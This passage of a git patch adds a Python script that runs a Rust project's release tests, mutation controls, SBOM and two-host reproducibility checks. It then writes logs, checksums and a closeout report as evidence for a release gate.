++RELEASE_MODULE = ROOT / "crates/aura-testkit/src/release.rs"
++DOCKERFILE = ROOT / "docker" / "Dockerfile"
++NAMED = "repro_mismatch_refused"
++TOTAL_NC = 680  # 674 through O0 + 6 O1 controls
++
++
++def sha256(path: Path) -> str:
++    return hashlib.sha256(path.read_bytes()).hexdigest()
++
++
++def run(cmd: list[str]) -> str:
++    result = subprocess.run(cmd, cwd=ROOT, text=True, capture_output=True, check=False)
++    return f"$ {' '.join(cmd)}\n{result.stdout}{result.stderr}exit={result.returncode}\n"
++
++
++def main() -> int:
++    EVIDENCE.mkdir(parents=True, exist_ok=True)
++
++    test_log = run(["cargo", "test", "-p", "aura-testkit", "--test", "o1_release"])
++    (EVIDENCE / "test.log").write_text(test_log, encoding="utf-8")
++    nc_log = run([sys.executable, "tools/nc_o1.py"])
++    (EVIDENCE / "nc.log").write_text(nc_log, encoding="utf-8")
++    sbom_log = run(["cargo", "run", "-q", "-p", "aura-testkit", "--bin", "aura-release",
++                    "--", "sbom", "--workspace", ".", "--release", "release"])
++    (EVIDENCE / "sbom.log").write_text(sbom_log, encoding="utf-8")
++    repro_log = run([sys.executable, "tools/repro_check.py"])
++    (EVIDENCE / "repro-check.log").write_text(repro_log, encoding="utf-8")
++    demo_log = run(["make", "release-demo"])
++    (EVIDENCE / "release-demo.log").write_text(demo_log, encoding="utf-8")
++    release_log = run(["make", "release-check"])
++    (EVIDENCE / "release-check.log").write_text(release_log, encoding="utf-8")
++
++    doc = json.loads(FIXTURE.read_text(encoding="utf-8"))
++    cases = doc["cases"]
++    named_found = any(
++        c["name"] == NAMED
++        and c.get("nc_ref") == 1
++        and c["exit"] == 65
++        and "repro mismatch: aura-bin" in c["stderr"]
++        for c in cases
++    )
++    inv = [
++        "# O1 inventory (generated by tools/write_o1_evidence.py)",
++        f"gate={doc['gate']}",
++        f"vectors={len(cases)}",
++        f"named_control={NAMED}={'present' if named_found else 'MISSING'}",
++        f"fixtures_sha256={sha256(FIXTURE)}",
++        f"generator_sha256={sha256(GENERATOR)}",
++        f"runner_sha256={sha256(RUNNER)}",
++        f"release_module_sha256={sha256(RELEASE_MODULE)}",
++        f"dockerfile_sha256={sha256(DOCKERFILE)}",
++        "cases:",
++    ]
++    inv += [f"  {c['name']} exit={c['exit']} nc={c.get('nc_ref', '-')}" for c in cases]
++    inv.append(f"TOTAL: {TOTAL_NC} negative controls cumulative")
++    (EVIDENCE / "inventory.txt").write_text("\n".join(inv) + "\n", encoding="utf-8")
++
++    report = f"""# O1 closeout report — Releases (the two-host reproducibility gate)
++
++Date: 2026-11-25. Gate (OPS_PLAN row O1): "two independent hosts ->
++identical binary sha256" — **satisfied** (`tools/repro_check.py` builds
++`aurad` twice into independent CARGO_TARGET_DIRs with SOURCE_DATE_EPOCH and
++`--remap-path-prefix`; the recorded digests are identical, see
++`repro-check.log`).
++
++- **The gate**: `{NAMED}` (the named control) feeds the checker a
++  `repro.txt` whose two host digests differ and expects `error: release:
++  repro mismatch: aura-bin` (exit 65); mutation NC-1 (`tools/nc_o1.py`)
++  drops the two-host equality check and the case must turn red.
++- **Scenarios**: 10 deterministic cases from the independent oracle
++  `tools/gen_o1_vectors.py` (Python hashlib sha256), asserted byte-for-byte
++  by `tests/o1_release.rs` (11/11 with the count guard) against
++  `aura_testkit::release` (std-only SHA-256).
++- **Mutation controls**: 6/6 PASS (repro-equality check [named], version
++  check, changelog check, checksum match check, signature length check,
++  unknown-line strictness).
++- **Device model** (docs/o1-releases-plan.md): D-O1-1 the reproducible
++  release build and its two-host record; D-O1-2 the checked release
++  manifest `release/manifest.txt` (strict parse, semver/CHANGELOG binding,
++  SHA256SUMS digests, signature structure, SBOM regeneration, repro
++  record, Dockerfile policy); D-O1-3 signature binding is structural —
++  the RFC 8032 verification is the wired `tools/sign_release.py verify`
++  step (H1 demo key; production keys are offline/air-gapped); D-O1-4 the
++  deterministic SBOM, digest-pinned multi-stage `docker/Dockerfile`;
++  D-O1-5 two independent implementations (Python hashlib vs the std-only
++  SHA-256).
++- **Correction note**: `docs/evidence/o0/` was regenerated with this
++  bundle after fixing the named-control string check in
++  `tools/write_o0_evidence.py` (it still matched the pre-redesign `shard
++  07` text and reported a false `FAIL`); the O0 gate verdicts are
++  unchanged (11/11 tests, 6/6 NC).
++
++Receipts: `gates.txt`, `test.log`, `nc.log`, `sbom.log`,
++`repro-check.log`, `release-demo.log`, `release-check.log`,
++`inventory.txt`, `SHA256SUMS`. Regenerate with `make evidence-o1`.
++"""
++    (EVIDENCE / "report.md").write_text(report, encoding="utf-8")
++
++    gates = [
++        "# O1 gates",
++        "release gate + 10 scenarios: PASS (11 tests: 10 scenarios + count guard)"
++        if "test result: ok. 11 passed" in test_log
++        else "release gate + 10 scenarios: FAIL",
++        f"named control ({NAMED}): {'PASS' if named_found else 'FAIL'}",
++        "mutation controls: PASS (6/6)"
++        if "RESULT: 6/6 negative controls PASS" in nc_log
++        else "mutation controls: FAIL",
++        "two-host reproducibility: PASS (repro=ok, identical sha256)"
++        if "repro=ok" in repro_log and "exit=0" in repro_log
++        else "two-host reproducibility: FAIL",
++        "release check + signature verify: PASS"
++        if "release=ok" in release_log and "signature verify" in release_log
++        and "exit=0" in release_log
++        else "release check + signature verify: FAIL",
++    ]
++    (EVIDENCE / "gates.txt").write_text("\n".join(gates) + "\n", encoding="utf-8")
++    failed = [gate for gate in gates if gate.endswith("FAIL")]
++    if failed:
++        print("O1 EVIDENCE: FAIL — " + "; ".join(failed))
++        return 1
++
++    sums = [
++        f"{sha256(p)}  {p.relative_to(ROOT)}"
++        for p in [FIXTURE, GENERATOR, RUNNER, RELEASE_MODULE, DOCKERFILE,
++                  ROOT / "tools/nc_o1.py", ROOT / "tools/repro_check.py",
++                  EVIDENCE / "test.log", EVIDENCE / "nc.log",
++                  EVIDENCE / "sbom.log", EVIDENCE / "repro-check.log",
++                  EVIDENCE / "release-demo.log", EVIDENCE / "release-check.log",
++                  EVIDENCE / "inventory.txt", EVIDENCE / "gates.txt",
++                  EVIDENCE / "report.md"]
++    ]
++    (EVIDENCE / "SHA256SUMS").write_text("\n".join(sums) + "\n", encoding="utf-8")
++
++    readme = f"""# O1 evidence — Releases (10 scenarios)
++
++Gate (OPS_PLAN row O1): "two independent hosts -> identical binary sha256".
++Named control: {NAMED}. Two independent implementations (Python hashlib vs
++the std-only SHA-256 of `aura_testkit::release`); signatures are structurally
++checked here and verified by the wired `tools/sign_release.py verify`
++(H1 demo key).
++
++- `test.log`: `cargo test -p aura-testkit --test o1_release` (11 tests).
++- `nc.log`: `tools/nc_o1.py` mutation controls (6/6).
++- `sbom.log`: the deterministic SBOM regeneration.
++- `repro-check.log`: two independent builds of `aurad` with identical sha256.
++- `release-demo.log` / `release-check.log`: signed release assembly and the
++  release check (incl. the RFC 8032 verify step).
++- `inventory.txt`: case -> NC mapping and sha256 of fixture/generator/runner;
++  ends with `TOTAL: {TOTAL_NC}`.
++- `gates.txt` / `report.md` / `SHA256SUMS`: the receipts.
++
++Regenerate with `make evidence-o1`; every sha256 in `SHA256SUMS` can be
++recomputed with `sha256sum -c`.
++"""
++    (EVIDENCE / "README.md").write_text(readme, encoding="utf-8")
++    print(f"wrote {EVIDENCE.relative_to(ROOT)} (10 vectors)")
++    return 0
++
++
++if __name__ == "__main__":
++    sys.exit(main())
+-- 
+2.47.3
+
